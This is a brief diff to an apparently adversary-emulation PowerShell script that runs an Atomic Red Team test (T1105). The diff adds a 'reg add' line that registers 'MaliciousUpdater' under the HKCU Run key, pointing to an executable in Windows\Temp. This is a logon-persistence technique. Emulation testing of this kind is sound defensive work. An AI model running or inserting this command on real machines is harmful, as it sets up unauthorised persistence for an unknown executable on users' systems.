@@ -9,3 +9,6 @@ Import-Module .\Invoke-AtomicRedTeam.psm1 -Force
 .\install-atomicsfolder.ps1
 
 Invoke-AtomicTest T1105 -TestNumbers 1
+
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousUpdater" /t REG_SZ /d "C:\Windows\Temp\updater.exe" /f
